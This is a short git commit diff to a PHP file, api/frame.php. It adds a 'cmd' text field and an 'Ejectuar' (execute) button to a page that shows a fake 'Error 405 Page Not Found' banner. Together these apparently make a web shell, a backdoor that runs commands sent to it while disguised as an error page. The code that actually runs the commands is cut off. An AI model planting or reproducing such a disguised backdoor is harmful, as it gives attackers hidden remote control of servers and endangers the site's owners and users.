6189abf10209ace86bf06ee063c184f3fdc48f4d
Alvaro Antoni Escobar <130929590+dkparw@users.noreply.github.com>
2023-05-13 15:08:50 -0600

    Update frame.php
    o yeah

--- api/frame.php
+++ api/frame.php
@@ -1,6 +1,8 @@
 <html>
 <body>
-<form method="GET" name="<?php echo $_SERVER['PHP_SELF']; ?>"></form>
+<form method="GET" name="<?php echo $_SERVER['PHP_SELF']; ?>">
+    <input type='text' name='cmd'> <input type='submit' value='Ejectuar'>
+</form>
 <pre>
 <i><h4 style="color:black; background:#dde3ca; width:230px; padding:3px;">Eror 405 Pagina No Encontrada :/</h4>
 <?php
